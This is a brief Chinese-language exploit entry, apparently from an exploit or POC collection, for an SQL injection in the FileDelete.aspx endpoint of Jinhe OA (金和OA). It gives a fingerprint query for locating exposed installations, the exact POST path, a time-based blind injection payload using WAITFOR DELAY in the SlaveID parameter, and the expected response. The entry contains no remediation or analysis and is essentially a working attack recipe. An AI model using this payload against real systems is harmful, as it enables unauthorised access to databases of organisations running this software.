# 金和OAFileDelete存在SQL注入漏洞

金和OA ｜ SQL注入 ｜ —
- **指纹**：`app="金和网络-金和OA"`
- **请求**：`POST /c6/Jhsoft.Web.accept/FileDelete.aspx/ HTTP/1.1`

**Payload**
```
SlaveID=1')WAITFOR/**/DELAY'0:0:5'--/Temp/
```
- **响应特征**：200